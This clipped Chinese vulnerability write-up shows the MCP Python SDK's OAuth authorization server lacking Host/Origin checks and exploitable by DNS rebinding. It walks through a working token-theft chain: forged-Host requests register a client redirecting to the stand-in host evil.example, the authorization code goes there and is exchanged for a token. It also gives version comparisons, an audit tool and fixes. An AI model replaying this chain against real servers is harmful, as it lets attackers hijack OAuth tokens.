---
title: 【先知】MCP SDK 的 Host 校验漏在了授权服务器上
source: https://xz.aliyun.com/news/92973
source_host: xz.aliyun.com
clip_date: 2026-10-20T15:00:04+08:00
trace_id: c2a6307d-f517-4a6a-addb-23820c6d6de6
content_hash: 9badd402011974a24217d0ef44fa7a47091ac0d794b090f0313b76d1ed50407c
status: synced
tags:
  - 先知
  - 漏洞分析
  - 协议分析
series: null
feed_source: 先知安全技术社区
ai_summary: "**TL;DR：** MCP Python SDK 传输层遇到伪造 Host 会返回 421，但同进程的 OAuth 授权服务器路由完全不校验 Host/Origin，可被 DNS rebinding 利用来注册客户端、走完授权并换到令牌。"
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ff75244-d011-8179-9187-df24221c8cea
ioc:
  cves: []
  cwes: []
  hashes:
    - f8b05d8026c0065e54c1c1da7a53f94a
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** MCP Python SDK 传输层遇到伪造 Host 会返回 421，但同进程的 OAuth 授权服务器路由完全不校验 Host/Origin，可被 DNS rebinding 利用来注册客户端、走完授权并换到令牌。
> 
> - **缺口定位：** `server/auth/routes.py` 只 import 了 `RequestBodyLimitMiddleware`，整个 `auth/` 目录找不到针对请求 Host/Origin 的判断；七个 OAuth 端点用伪造 Host 探测时全部没有返回 421，`/register` 甚至返回 201 并当场签发 client_id/client_secret。
> - **传输侧对照：** `/mcp`（streamable-http）和 legacy SSE 的 `/sse`、`/messages/` 在伪造 Host 下都返回 421；不带令牌时先返回 401，因为认证中间件包在传输层外面，会先执行。
> - **版本沿革：** 从 2.0.0 到 2.3.0，`auth/routes.py` 里只补进了请求体限制（5MB 请求由 201 变 413），`TransportSecurityMiddleware` 在这条线上出现次数始终是 0；对应提交 #3336 只改动了 `_body_limited`。
> - **影响边界：** 只有直接用 `create_auth_routes()` 组装 ASGI 应用的部署受影响；FastMCP 自带 `HostOriginGuardMiddleware`，会统一校验 Host/Origin；链路的先决条件是动态客户端注册处于开启状态。
> - **修复取舍：** 直接挂 SDK 中间件会因为“POST 必须是 JSON”把 OAuth 表单流程打成 400，应拆出独立的 Host/Origin 校验；临时方案是在反向代理层对不认识的 Host `return 444`；同时必须收紧 `redirect_uris` 白名单，否则补上校验后令牌仍会发到攻击者地址。

复现环境：Ubuntu 24.04.4 LTS，Python 3.12.3，venv 隔离。授权服务器和 MCP 资源服务器都跑在这一台机器上，监听 127.0.0.1，端口 9000 和 8001；代码取自官方示例 examples/servers/simple-auth（tag v2.3.0）。对照组另外起了两个实例：一个跑 2.0.0 的授权服务器（端口 9100），一个给授权服务器套上 SDK 自带的传输安全中间件（端口 9001）。文中出现的 Host 值、客户端凭据都是我自己写的测试值，命令在 SSH 里执行，输出没有修改过，截图可复现。

## 写在前面

这篇讲一个我查了几天才敢下结论的缺口：MCP 官方 Python SDK 会给传输层的请求做 Host/Origin 校验，不合规直接回 421，但它自带的那套 OAuth 授权服务器不做这件事。授权服务器是发访问令牌的地方，两种请求落在同一个进程里。

版本是现查的，不是凭印象写的：mcp 在 PyPI 上的最新发行版是 2.3.0（2026-10-02 上传），1.x 线最新是 1.30.0（2026-09-07）。下面所有结论都是在这条线上验证的。

起环境就三条命令：

```plain
python3 -m venv ~/mcp-venv
~/mcp-venv/bin/pip install mcp uvicorn pydantic-settings click requests
cd ~/asdemo
setsid nohup ~/mcp-venv/bin/python -m mcp_simple_auth.auth_server --port 9000 &
setsid nohup ~/mcp-venv/bin/python -m mcp_simple_auth.server     --port 8001 &
```

结构大概是这样：

```plain
攻击者页面（浏览器里）
                |
                | DNS rebinding：攻击者域名解析到 127.0.0.1
                v
   +---------------------------- 本机 127.0.0.1 ----------------------------+
   |                                                                        |
   |   :9000  自带 OAuth 授权服务器                                          |
   |          /.well-known/oauth-authorization-server   /authorize          |
   |          /register   /token   /revoke   /introspect                     |
   |          ^ Host/Origin 不校验                                           |
   |                                                                        |
   |   :8001  MCP 资源服务器（streamable-http 的 /mcp）                       |
   |          ^ Host 不对 -> 421 Invalid Host header                         |
   +------------------------------------------------------------------------+
```

导览一句：第一节说清这两个面为什么会被放在一起看，第二节到第四节是源码和实测的对照，第五节把链路走完，第六节往版本历史里找原因，第七节查台账，第八节划边界，剩下两节是工具和修复。

## 一、先看清这两个面

### 传输层那套防护是干嘛的

MCP 的 HTTP 传输跑在本机端口上的场景很常见：用户在自己电脑上起一个 server，给本地的 AI 客户端连。这种部署最大的风险之一是 DNS rebinding —— 攻击者让一个域名解析到 127.0.0.1，受害者浏览器里的页面就和本机服务变成同源，可以随便发请求、也能读响应。

SDK 为此写了专门的中间件：请求进来先看 Host 头在不在白名单里，Origin 头对不对，不在就返回 421 Misdirected Request。白名单支持 127.0.0.1:\* 这种写法，端口部分做通配。sse_app() 和 streamable_http_app() 在绑定地址是回环地址时会自动把防护打开。跑在本机的 Docker 或裸进程按默认写法起服务，这道检查是开着的。

### 自带授权服务器是另一个东西

除了传输，SDK 还提供一整套 OAuth 2.0 授权服务器：create_auth_routes() 返回 metadata、authorize、token、register、revoke 五组路由，配一个 provider 就能跑。官方示例 servers/simple-auth 就是照着这个搭的，另外加了登录页、登录回调和自省端点。

做 MCP 的人对这个不陌生：客户端要拿令牌才能连受保护的 server，很多部署就是拿这套路由直接当授权服务器用，或者把它当成对接企业 IdP 的中间层。

### 它们在同一个进程里

我一开始没把这两块放在一起想过。直到翻 transport_security.py 的时候发现一件事：传输层的防护和授权服务器需要的那个请求体限制，是写在同一个文件里的两个类。一个文件承担两种校验，说明维护者对 HTTP 面上该做什么是清楚的。那就该问一句：授权服务器那边的请求，有没有走同一套检查。

## 二、两个类写在同一个文件里

### 一个管 Host，一个管大小

src/mcp/server/transport_security.py 里定义了三个类，后面两个是重点：

```plain
class TransportSecuritySettings(BaseModel):      # 白名单配置
class TransportSecurityMiddleware:               # 校验 Host/Origin，不过就返回 421
class RequestBodyLimitMiddleware:                # 限制请求体大小，超了返回 413
```

前者就是第一节说的那套防护；后者是 2026 年 8、9 月才补进来的，管请求体大小。

### 授权服务器只 import 了其中一个

去看 src/mcp/server/auth/routes.py 的 import：

from mcp.server.transport_security import DEFAULT_MAX_REQUEST_BODY_SIZE, RequestBodyLimitMiddleware

只拿了请求体限制那个类。Host/Origin 校验的类，一个字都没提到。

五组路由的挂法是这样：

```plain
Route(
    AUTHORIZATION_PATH,
    endpoint=_body_limited(request_response(AuthorizationHandler(provider).handle)),
    methods=["GET", "POST"],
),
Route(
    TOKEN_PATH,
    endpoint=_cors(_body_limited(request_response(token_handler.handle)), ["POST", "OPTIONS"]),
    methods=["POST", "OPTIONS"],
),
```

挂的是 \_cors 和 \_body_limited 两个装饰器，一个管跨域响应头，一个管请求体大小。没有第三个。

把两个文件里的用法拉出来对数：

```plain
$ grep -n "validate_request" .../mcp/server/streamable_http.py .../mcp/server/sse.py
streamable_http.py:506:    error_response = await self._security.validate_request(request, is_post=is_post)
sse.py:145:            error_response = await self._security.validate_request(request, is_post=False)
sse.py:235:            error_response = await self._security.validate_request(request, is_post=True)

$ grep -rn "TransportSecurityMiddleware" .../mcp/server/auth/
（没有输出）
```

传输侧命中七行，其中三行是对中间件的调用，另外四行是它内部的转发辅助函数；授权服务器侧零行。这两条命令的差别，就是这篇文章的全部内容。

### 整个 auth 目录搜不到 Host 校验

不放心只看这一个文件，把整个 server/auth/ 目录扫了一遍：handlers、middleware、routes、settings 全算上，搜 host、origin、referer，命中的只有两处跟请求无关的东西 —— issuer URL 的格式校验，和 allow_origins="\*" 这个跨域配置。真正对请求头做判断的代码，一行都没有。

## 三、传输侧确实在守

### 往 /mcp 打一个伪造 Host

光看代码不够，得打一发。先准备一个令牌（第五节的链路会完整走一遍，这里直接用结果），然后打一发正常的，确认这条路径本身是通的：

```plain
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" -d '{}' http://localhost:8001/mcp
# 400 —— 请求体是空的，业务层报参数不对，说明请求已经进到传输里了
```

然后 Host 写成一个不存在的域名：

```plain
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  -H "Host: evil.example" -H "Authorization: Bearer $TOK" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{}' http://localhost:8001/mcp
```

返回 421。资源服务器的日志里能看到是谁拦的：

```plain
WARNING:mcp.server.transport_security:Invalid Host header: evil.example
INFO:     127.0.0.1:39402 - "POST /mcp HTTP/1.1" 421 Misdirected Request
```

### legacy SSE 也一样

换一个传输试试，看是不是某一个实现漏了。示例支持 --transport sse，起在 8002：

```plain
curl -s -o /dev/null -m 3 -w "%{http_code}\n" -H "Authorization: Bearer $TOK" http://127.0.0.1:8002/sse
# 200（流建立）

curl -s -o /dev/null -m 3 -w "%{http_code}\n" -H "Authorization: Bearer $TOK" -H "Host: evil.example" http://127.0.0.1:8002/sse
# 421

curl -s -o /dev/null -m 3 -w "%{http_code}\n" -H "Authorization: Bearer $TOK" -H "Host: evil.example" \
  -X POST -H "Content-Type: application/json" -d '{}' "http://127.0.0.1:8002/messages/?session_id=x"
# 421
```

两个传输都拦。到这一步基本可以确定问题不在"某个传输忘了挂中间件"，而是"这一侧整体没做"。

### 401 为什么排在 421 前面

中间踩了个坑，值得写出来：不带令牌发同样的请求，返回的不是 421 而是 401。

{"error": "invalid_token", "error_description": "Authentication required"}

原因不复杂：认证中间件包在传输外面，先判断身份；身份不过就直接 401 了，根本走不到 Host 校验那一步。所以想看 421，令牌必须是这套授权服务器签发的，而且 resource 字段跟目标对得上。我第一次忘了在授权请求里带 resource，令牌的 aud 是空的，资源服务器照样拒，白跑了两轮。

## 四、授权服务器这一面不设防

### 我怎么探的

思路很简单：把第三节那个伪造 Host 原样打到授权服务器的每一个端点上，看它是拒绝还是照常处理。区别很明显：SDK 拒绝的时候固定返回 421，其他任何返回码都说明请求进了业务逻辑。

探测发的是无害请求：GET 拿元数据、POST 空表单或一个不带敏感字段的注册体。工具是后来写的那个，逻辑就这几行：

```plain
hdrs = {"Host": host, "Origin": f"https://{host}"}
req = urllib.request.Request(url, data=body, method=method, headers=hdrs)
```

### 七个端点的实际返回

Host 写成一个不可能存在的域名，Origin 也一起带上：

```plain
端点                                                      HTTP   结论
授权服务器元数据 /.well-known/oauth-authorization-server  200    未被 Host 拦截
资源元数据 /.well-known/oauth-protected-resource          404    未被 Host 拦截（请求已进入业务处理）
授权端点 /authorize                                       400    未被 Host 拦截（请求已进入业务处理）
动态客户端注册 /register                                  201    未被 Host 拦截
令牌端点 /token                                           401    未被 Host 拦截（请求已进入业务处理）
吊销端点 /revoke                                          404    未被 Host 拦截（请求已进入业务处理）
令牌自省 /introspect                                      400    未被 Host 拦截（请求已进入业务处理）
```

七个端点，一个 421 都没有。/register 那条最直白，伪造的 Host 下它返回 201，响应体里带着一对刚签发的客户端凭据：

```plain
{"client_name":"probe","redirect_uris":["http://evil.example/cb"],"grant_types":["authorization_code"],
 "token_endpoint_auth_method":"client_secret_post",
 "client_id":"d34011cf-a344-42c3-9204-987dcbc65257",
 "client_secret":"6f37dae967ba5daf...","client_id_issued_at":1791164230}
```

这次探测和第五节的完整链路是两次独立的注册，所以两处的 client_id 对不上，不是写错了。

拿 OAuth 的视角看，这一步等于攻击者在这个授权服务器上注册了自己的应用，回调地址指向自己的域名，而服务端连来者的 Host 都没看一眼。

### 预检放行但缺私有网络头

把响应头也看了一下。/register 的响应带 access-control-allow-origin: \*，/token 的 OPTIONS 预检也放行，允许的方法、头部都返回了。

这里有个细节得说清楚：这些 CORS 头允许任意站点读响应，但响应里没有 access-control-allow-private-network。现代 Chrome 的 Private Network Access 会把公网页面发往本机端口的请求挡下来，缺这个头就过不去预检。所以"随便一个网页直接 fetch 本机 9000"这条路在浏览器上走不通，真正能用的是 DNS rebinding —— 重新绑定之后请求就是同源的，预检和 PNA 都不参与。

把这条搞清楚很重要，它决定了攻击的入口在哪，也决定了后面第五节为什么用伪造 Host 来模拟。

## 五、把链路走完

### 注册一个回调指向攻击者的客户端

先注册客户端，redirect_uris 直接写成攻击者控制的地址：

```plain
[1] 客户端注册（Host: evil.example）
    HTTP 201
    client_id     = 53bca2ef-e4df-4d21-819c-d50c77e46c19
    client_secret = ed4a77059a56d0cd...
    redirect_uri  = http://evil.example/cb
```

注册环节不校验 Host，也不限制回调地址 —— 攻击者想让令牌落到哪就落到哪。

### 授权与登录回调

拿刚注册的 client_id 发起授权，PKCE 的 challenge 自己生成：

```plain
[2] 发起授权（Host: evil.example）
    HTTP 302  Location=http://localhost:9000/login?state=rebindstate&client_id=53bca2ef-...
```

授权端点把请求转给了登录页。示例的 provider 是表单登录，提交到 /login/callback：

```plain
[3] 提交登录（Host: evil.example）
    HTTP 302  Location=http://evil.example/cb?code=***&state=rebindstate
    code = mcp_f8b05d8026c0065e54c1c1da7a53f94a
```

302 的 Location 指向攻击者的地址，授权码跟在后面。整个流程里 Host 一直是伪造的那个。

### 换令牌

拿授权码去 /token 换访问令牌：

```plain
[4] 换令牌（Host: evil.example）
    HTTP 200
    access_token = mcp_22dceca512c9a434feae...
    expires_in   = 3600
```

自省接口确认这个令牌是活的，sub 是登录用的账号，aud 指向 MCP 资源服务器：

```plain
[5] 自省（Host 正常）
    {"active":true,"client_id":"53bca2ef-...","scope":"user","sub":"demo_user","aud":"http://localhost:8001/mcp"}
```

### 拿令牌打 MCP

用这个令牌连 MCP 资源服务器：

```plain
[6] initialize（Host 正常 localhost:8001）
    HTTP 200
    {"jsonrpc":"2.0","id":1,"result":{"capabilities":{...,"tools":{"listChanged":false}},
     "instructions":"Resource Server t...
```

会话建起来了，工具列表也在返回里。到这里链条闭合： **从注册到拿到令牌，全部由带伪造 Host 的请求完成；而带同一个 Host 的请求打 MCP 传输，是 421。**

### 六步请求的清单

这六步对应到请求上就是这么几条（每一步都带 -H "Host: evil.example"，只有最后一步用正常 Host）：

```plain
POST /register                 注册客户端，redirect_uris 填攻击者地址
GET  /authorize                带 client_id、redirect_uri、code_challenge、resource
POST /login/callback           提交登录表单，拿回 302 里的授权码
POST /token                    用授权码 + code_verifier 换 access_token
POST /introspect               确认令牌有效（可选，验一下手上这个能不能用）
POST /mcp  initialize          带令牌连 MCP 资源服务器
```

前四条是授权服务器上的流程，第五条是自省，第六条落到 MCP 传输上。按这个顺序串下来就是一条完整的验证链，第九节的工具就是把它拆成可单独调用的探测。

那些 client_id、授权码、令牌都是某一次运行的输出 —— 重复跑会拿到全新的值，这不影响结论，能对上的固定值是那些 HTTP 状态码和 302 的跳转目标。

### 这一段我用的是示例的演示账号

得把话说清楚：登录那一步我用的是示例自带的演示账号（demo_user / demo_password）。这不是"无需交互就能拿令牌"，缺 Host 校验这件事本身，不等于登录环节可以被绕过。

为什么这仍然是问题？因为登录环节的强度取决于 provider 怎么配：

-   换成对接企业 IdP 的 provider，受害者在 IdP 上有活跃会话时，授权流程会自己走完，攻击者只需要等授权码回到自己的回调地址；
-   保留示例这种本地表单，攻击者页面可以用 rebinding 之后的同源身份去请求 /authorize，把登录页的内容拿过来渲染在自己的页面上，骗到凭据；
-   这几条都不依赖"猜密码"，靠的是那条本该拦住跨源请求的 Host 校验不在。

另外，示例本身写着 "NOT production-ready"，这不是拿示例当靶子的意思：create_auth_routes() 是 SDK 的公开接口，示例只是照着它搭出来的最小形态，缺校验的是这个接口返回的路由。

## 六、版本对比：补了旁边那条，没补这条

### 2.0.0 与 2.3.0 各起一个实例

既然 RequestBodyLimitMiddleware 是 2026 年 8、9 月才进授权服务器的，那就把改动前后各跑一遍。两个版本各用独立 venv，互不干扰：

```plain
python3 -m venv ~/mcp200-venv
~/mcp200-venv/bin/pip install "mcp==2.0.0" click pydantic-settings requests
cd ~/asdemo200 && setsid nohup ~/mcp200-venv/bin/python -m mcp_simple_auth.auth_server --port 9100 &
```

2.0.0 的示例代码从同一个仓库的 v2.0.0 tag 里取，保证跟那版 SDK 对得上。

### 5MB 请求体那个对照

同一组请求，两个版本各打一遍：

```plain
mcp 2.0.0      mcp 2.3.0
伪造 Host -> well-known        200            200
伪造 Host -> /register         201            201
伪造 Host -> 5MB 请求体        201            413
```

2.0.0 上 5MB 的注册请求被照单收下，2.3.0 上返回 413 Request body too large。请求体限制确实补进去了，Host 校验没有 —— 这一轮改动动的是同一个文件里的另一个类。

### 两条线的版本情况

把整条线也核了（GitHub contents API 按 tag 取文件，数关键类名出现次数）：

```plain
v1.28.1        TransportSecurityMiddleware=0   RequestBodyLimitMiddleware=0
v2.0.0         TransportSecurityMiddleware=0   RequestBodyLimitMiddleware=0
v2.3.0         TransportSecurityMiddleware=0   RequestBodyLimitMiddleware=2
v1.x 分支      TransportSecurityMiddleware=0   RequestBodyLimitMiddleware=2
```

从 1.x 到 2.x，Host 校验在这个文件里的出现次数一直是 0。

## 七、提交史与台账

### 传输侧这一年的账

传输侧那套防护从 2025 年 6 月进来（Add support for DNS rebinding protections #861），之后一路加厚：

```plain
2026-03   #2269 / #2275 / #2287  默认关闭 -> 默认开启
2026-08   #3364                  白名单前缀匹配绕过（startswith base + ":"）
2026-09   #3465                  :* 通配必须真的是数字端口
2026-09   #3594                  显式绑定非本机地址时也要自动开启
2026-09   #3562 / #3576          默认值与 Origin 是否 opt-in（还开着）
```

一年下来，这条线上有人报、有人修、有人再报。这是好事，说明这套防护在维护中。

### 授权服务器侧的十九次提交

src/mcp/server/auth/routes.py 一共 19 次提交，时间跨度 2025-05 到 2026-08。数提交用 GitHub 的 commits 接口按路径过滤，一次拉一百条：

curl -s "https://api.github.com/repos/modelcontextprotocol/python-sdk/commits?path=src/mcp/server/auth/routes.py&per_page=100"

挨个看标题，跟请求校验沾边的只有一次：fix: use exact match for loopback hosts in issuer URL validation (#2089) —— 那是 issuer URL 的匹配规则，跟请求里的 Host 头没关系。剩下十八次是路由拆分、错误码、元数据字段这类改动。

最近那一次提交值得单独说一句：2026-08-20 的 Apply the request body limit to the SSE and OAuth endpoints (#3336)。它就是那个把请求体限制补进授权服务器的改动 —— 改的是这个文件，动的是 \_body_limited，Host 校验在同一个窗口里没有被一起处理。

### issue 与公告里搜不到

翻台账的时候特意搜了三个地方：issue/PR 里搜 oauth host、auth routes dns rebinding，都是零结果；安全公告列表 11 条里，DNS rebinding 相关的只有 2025-12 那条 GHSA-9h52，讲的是传输。这块地方被审了一整年，审的都是传输那一面。

## 八、边界：谁受影响，谁不受

### 直连 SDK 组装的部署

受影响的写法是直接用 create_auth_routes() 组装 ASGI 应用。这不是我在挑边角用法，官方文档里写得很直白：create_auth_routes 返回的授权服务器路由，任何 Starlette 应用都能挂，仓库里的 examples/servers/simple-auth/ 就是这么跑的。这类部署里，授权服务器和 MCP 传输在同一个应用、同一个端口空间，前者不校验 Host，后者校验。

### FastMCP 为什么没事

FastMCP 是另一条路。它自己写了 HostOriginGuardMiddleware，在自己的 HTTP 层统一校验 Host 和 Origin，代码注释写得很直接：FastMCP owns DNS-rebinding protection via HostOriginGuardMiddleware。它内部也调用 SDK 的 create_auth_routes()，但那套路由被包在它自己的守卫里面。

这个对照反而让结论更清楚：同一个生态里，框架层独立意识到"这道校验得做"，并且做了；SDK 自带的那套参考实现没有。

### 一个前提：动态客户端注册得是开着的

整条链路的第一步是注册客户端，所以它依赖授权服务器开了动态客户端注册（RFC 7591）。对攻击者而言有个好消息：这本来就是 MCP 的常态。客户端连一个没见过的服务器时，走的就是"发现元数据 → 注册客户端 → 授权"这条标准路，示例里的 ClientRegistrationOptions(enabled=True) 也是这么配的。

如果某个部署关掉了注册端点，攻击者手上得有现成的 client_id。这时候缺 Host 校验仍然是个问题 —— 它让攻击者能拿这个 client_id 直接驱动授权流程，只是门槛高了一档。这条前提我写出来，是因为它决定受影响部署的实际数量。

### 结论范围就一句话

范围就这么大： **调** **create_auth_routes()** **自己组装应用的部署，授权服务器侧没有 Host/Origin 校验。** 走 FastMCP 挂载的不受影响；把授权服务器放在独立进程、前面有反向代理拦 Host 的也不受影响。写安全分析最容易犯的错是把范围吹大，我这次的边界就划在这里。

## 九、工具

### 它校验什么

探测这点事手打两三行 curl 也能做，但每次换目标都要重新拼参数，索性写成了工具：

python3 mcp-as-hostcheck-audit.py --as-url http://127.0.0.1:9000

它对着七个 OAuth 端点各发一次带伪造 Host（同时带伪造 Origin）的请求，按返回码判断服务端有没有因为 Host 拒绝；如果给了 --mcp-url 和 --token，再拿同一个 Host 打一次 MCP 传输做对照。

### 退出码

退出码按约定来：1 表示发现了未做 Host 校验的端点，0 表示摸到的端点都拒绝了，2 留给参数错误。挂到 CI 里当门禁，比人工巡检靠得住。

### 跑出来的样子

```plain
端点                                                      HTTP   结论
授权服务器元数据 /.well-known/oauth-authorization-server  200    未被 Host 拦截
资源元数据 /.well-known/oauth-protected-resource          404    未被 Host 拦截（请求已进入业务处理）
授权端点 /authorize                                       400    未被 Host 拦截（请求已进入业务处理）
动态客户端注册 /register                                  201    未被 Host 拦截
令牌端点 /token                                           401    未被 Host 拦截（请求已进入业务处理）
吊销端点 /revoke                                          404    未被 Host 拦截（请求已进入业务处理）
令牌自省 /introspect                                      400    未被 Host 拦截（请求已进入业务处理）

MCP 传输对照: http://localhost:8001/mcp
  带令牌 + 伪造 Host                      421    被拒(421 Invalid Host)
  不带令牌 + 伪造 Host                    401    返回 401（认证中间件通常在 Host 校验之前）

授权服务器侧未因 Host 被拦的端点 7 个
```

这张表和第四节那张是同一份输出 —— 工具本身没做任何额外的判断，它只是把七个端点的返回按同一把尺子过了一遍。

### 局限

三个要交代的：

1.  判据是"返回码不是 421/403-Origin"，属于黑盒推断。服务端如果把校验写成了别的响应码，工具会说没守（假阳性），得人工确认一次。
2.  只探七个端点，provider 自己加的路由（示例的 /login、/login/callback、/introspect）不在清单里 —— 那几个我单独打过，同样不校验：/login/callback 伪造 Host 返回 400（缺 state），/introspect 返回 200。
3.  它看的是"有没有这道校验"，不查业务逻辑漏洞。别拿它当全量扫描器。

碰到返回 404 的端点别急着下结论。有些部署把元数据端点挂在别的路径上，或者干脆关掉了注册和吊销，这时候工具报出来的"未被 Host 拦截（404）"其实什么都没证明。我给自己定的用法是：工具报出可疑端点之后，人工挑 /authorize 和 /register 再手打一遍 curl，看响应体里是不是真有业务内容。

## 十、修复建议（都跑过）

### 直接挂 SDK 中间件会打断表单流程

思路里的第一版是"那还不简单，把同文件里那个中间件挂上去"。挂上去之前先测了一遍，结果值得记下来：起了个 9001 端口，把 TransportSecurityMiddleware 包在授权服务器应用外面。

```plain
[正常 Host] well-known          200
[伪造 Host] well-known          421      <- 缺口补上了
[伪造 Host] /register           421
[正常 Host] /register           201
[正常 Host] 表单 POST /login/callback  400 "Invalid Content-Type header"   <- 副作用
```

前四行是好消息，最后一行是坏消息：validate_request(is_post=True) 假定所有 POST 都是 application/json，而 OAuth 的表单流程（登录回调、grant_type=authorization_code 那几条）发的是 application/x-www-form-urlencoded，直接被打成 400。

这就是"直接复用"走不通的地方：那个中间件把"校验 Host/Origin"和"POST 必须是 JSON"绑在了一个方法里。想清楚这一点，再看维护者当初为什么只把请求体限制那个类挂到授权服务器上，就不难理解了 —— 同文件里的另一个类不是拿过来就能用的。

### 拆开校验或至少查 Host

修法按代价从小到大排：

1.  先把 Host 校验单独做一次，放在 OAuth 路由最外层，只做一件事：Host 不在白名单就 421。
2.  Origin 校验同理，独立于 content-type 判断。
3.  更彻底的做法是把 TransportSecurityMiddleware 里的 content-type 断言挪走 —— 那个断言本来就不属于"传输安全"的范畴，is_post 这个参数把两件事揉在了一起。

还有一点，is_post 这个参数在传输侧有同样的味道：请求体类型该由业务层决定，不该由安全中间件替它拍板。

### 部署侧现在就能做的

不能等上游的话，有三条能立刻落地，第一条我在服务器上验了：

1.  授权服务器前面挂一层反向代理，Host 不认识就直接断连：

```plain
server {
    listen 9101;
    server_name localhost 127.0.0.1;
    if ($host !~ ^(localhost|127\.0\.0\.1)(:9101)?$) { return 444; }
    location / { proxy_pass http://127.0.0.1:9000; proxy_set_header Host $host; }
}
```

代理指向原来那个不设防的 9000 实例，再打一遍：

```plain
[正常 Host]  well-known  200
[伪造 Host]  well-known  000     <- 连接被直接关掉
[伪造 Host]  /register   000
[正常 Host]  /register   400     <- 穿过代理到了业务层
```

伪造 Host 的请求连响应都没有，代理层就掐了。这套配置的好处是不用改一行 Python，坏处是把校验交给了运维，得多一条"这份配置别被人删掉"的约束。

1.  生产部署不该把授权服务器和 MCP 传输放在同一个进程同一个端口空间。两者分开部署，令牌签发面和资源面拆开，这个缺口的可利用性会掉一大截 —— 攻击者 rebinding 打到的那个端口上，没有可以直接换成令牌的东西。
2.  别用本地表单 provider。对接企业 IdP，把"谁在授权"交给已有会话体系，同时把 redirect_uri 白名单收紧到自家域名。这条是三件事里最治本的，代价也最高。

写到这里停一下，还有一件差点漏掉的事：示例的注册端点是允许任意 redirect_uris 的，我注册的时候填 http://evil.example/cb 直接通过。真实部署里这一步必须收紧，不然 Host 校验补上了，令牌还是会发到攻击者手里。
